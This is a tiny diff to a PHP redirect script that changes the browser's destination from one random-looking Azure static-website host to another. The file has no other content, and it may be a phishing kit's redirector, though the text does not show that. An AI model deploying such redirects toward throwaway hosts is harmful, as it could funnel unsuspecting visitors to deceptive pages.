@@ -2,7 +2,7 @@
 <?php
  
 // Redirect browser
-header("Location: https://dr567uhf.z33.web.core.windows.net/");
+header("Location: https://dwe345t.z6.web.core.windows.net/");
  
 exit;
 ?>
